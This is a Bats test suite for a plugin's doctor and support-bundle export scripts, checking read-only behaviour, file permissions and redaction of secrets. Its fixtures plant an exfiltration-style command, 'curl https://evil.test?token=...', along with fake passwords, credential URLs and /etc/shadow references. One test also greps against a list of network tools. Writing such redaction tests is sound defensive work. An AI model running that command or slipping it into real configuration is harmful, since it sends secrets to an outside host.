load helpers

LIB="$BATS_TEST_DIRNAME/../plugins/nightshift/lib/lib.sh"
EXPORT="$BATS_TEST_DIRNAME/../plugins/nightshift/runtime/export-support.sh"
DOCTOR="$BATS_TEST_DIRNAME/../plugins/nightshift/runtime/doctor.sh"
DOCTOR_SKILL="$BATS_TEST_DIRNAME/../plugins/nightshift/skills/doctor/SKILL.md"
SCRIPT="$BATS_TEST_DIRNAME/../plugins/nightshift/runtime/export-support.sh"

fingerprint() {
  (cd "$1" && find . \( -type f -o -type l \) -exec cksum {} \; | sort)
}

bundle_mode() {
  case "$(uname -s)" in
    Darwin) stat -f %Lp "$1" ;;
    *) stat -c %a "$1" ;;
  esac
}

@test "Doctor offers export and stays read-only" {
  p="$(new_project)"
  before="$(fingerprint "$p")"
  run bash "$DOCTOR" --project "$p"
  [ "$status" -eq 0 ]
  printf '%s' "$output" | grep -q '\[confirm\].*export-support.sh'
  printf '%s' "$output" | grep -qi 'never uploaded'
  after="$(fingerprint "$p")"
  [ "$before" = "$after" ]
  [ ! -d "$p/.nightshift/support" ]
  grep -qF 'export-support.sh' "$DOCTOR_SKILL"
  grep -qF 'Invoking Doctor alone must not create' "$DOCTOR_SKILL"
  grep -qF 'runtime/export-support.sh' "$BATS_TEST_DIRNAME/../docs/commands.md"
  grep -qF 'runtime\windows\export-support.ps1' "$BATS_TEST_DIRNAME/../docs/commands.md"
}

@test "export writes a 0600 local bundle and never phones home" {
  p="$(new_project)"
  ! grep -E 'curl|wget|nc |ssh |scp |npx |pip ' "$SCRIPT"
  run bash "$EXPORT" --project "$p"
  [ "$status" -eq 0 ]
  printf '%s' "$output" | grep -q 'Support bundle:'
  printf '%s' "$output" | grep -q 'Included:'
  printf '%s' "$output" | grep -q 'Omitted:'
  printf '%s' "$output" | grep -qi 'never uploaded'
  bundle="$(printf '%s' "$output" | sed -n 's/^Support bundle: //p')"
  [ -f "$bundle" ]
  [ "$(bundle_mode "$bundle")" = "600" ]
  grep -q 'Nightshift support bundle' "$bundle"
  grep -q 'name: nightshift' "$bundle"
  grep -q 'validity: valid' "$bundle"
  ! grep -q 'DO NOT STOP' "$bundle"
}

@test "support reports lease state but omits the ownership capability" {
  p="$(new_project)"
  printf 'shift-session\n\n\n\nclaude\n' >"$p/.nightshift/.shift-session"
  claim="$(bash -c '. "$1"; ns_lease_takeover "$2/.nightshift" shift-session claude' \
    nightshift "$LIB" "$p")"
  nonce="${claim#* }"

  run bash "$EXPORT" --project "$p"
  [ "$status" -eq 0 ]
  bundle="$(printf '%s' "$output" | sed -n 's/^Support bundle: //p')"
  grep -q 'process_lease: valid' "$bundle"
  grep -q 'lease_host: claude' "$bundle"
  grep -q 'lease_mode: recovered' "$bundle"
  ! grep -qF "$nonce" "$bundle"
}

@test "hostile secrets, URLs, user paths, and transcripts do not survive" {
  p="$(new_project)"
  sid='aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee'
  printf '%s\n/Users/victim/transcript.jsonl\n\n\nclaude\n' "$sid" >"$p/.nightshift/.shift-session"
  python3 -c '
import json,sys
p=sys.argv[1]
with open(p) as f: d=json.load(f)
d["notifyCommand"]="curl https://evil.test?token=s3cret"
d["expectedEmail"]="owner@example.com"
with open(p,"w") as f: json.dump(d,f)
' "$p/.nightshift/rules.json"
  {
    printf 'password=supersecret\n'
    printf 'https://user:hunter2@example.com/hook\n'
    printf 'https://example.com/x?access_token=abcd\n'
    printf '%s/secret-dir/key.pem\n' "$HOME"
    printf '/etc/shadow leaked\n'
    printf 'normal schedule line at %s\n' "$p"
  } >"$p/.nightshift/scheduled.log"
  printf 'PROMPT: do not copy me\n' >"$p/.nightshift/owner-notes.md"
  export NIGHTSHIFT_SUPPORT_LEAK=should-never-appear
  run bash "$EXPORT" --project "$p"
  [ "$status" -eq 0 ]
  bundle="$(printf '%s' "$output" | sed -n 's/^Support bundle: //p')"
  [ -f "$bundle" ]
  ! grep -F 'supersecret' "$bundle"
  ! grep -F 'hunter2' "$bundle"
  ! grep -F 's3cret' "$bundle"
  ! grep -F 'owner@example.com' "$bundle"
  ! grep -F 'curl https://evil.test' "$bundle"
  ! grep -F "$sid" "$bundle"
  ! grep -F 'transcript.jsonl' "$bundle"
  ! grep -F 'PROMPT: do not copy me' "$bundle"
  ! grep -F 'should-never-appear' "$bundle"
  ! grep -F '/etc/shadow' "$bundle"
  ! grep -F "$HOME/secret-dir" "$bundle"
  grep -qE 'normal schedule line at \$(WORKSPACE|WORK_TARGET)' "$bundle"
  grep -q 'keys:' "$bundle"
  grep -q 'notifyCommand' "$bundle"
  grep -q 'session_record: present' "$bundle"
}

@test "identities are tokenized to the three named roots" {
  p="$(new_project)"
  run bash "$EXPORT" --project "$p"
  [ "$status" -eq 0 ]
  bundle="$(printf '%s' "$output" | sed -n 's/^Support bundle: //p')"
  grep -qE 'task: \$(WORKSPACE|WORK_TARGET|HOME)' "$bundle"
  ! grep -F "$p" "$bundle"
}

@test "sanitizer omits secret lines and unresolved absolute paths" {
  run bash -c '. "$1"
    ns_secret_line "password=abc" && echo secret
    ns_sanitize_line "https://x.com?token=1" /tmp /tmp /tmp || echo omitted
    ns_tokenize_text "/tmp/proj/file" /tmp /tmp/proj /tmp/proj/repo && echo
  ' _ "$LIB"
  printf '%s' "$output" | grep -q secret
  printf '%s' "$output" | grep -q omitted
  printf '%s' "$output" | grep -q '\$WORKSPACE/file'
}
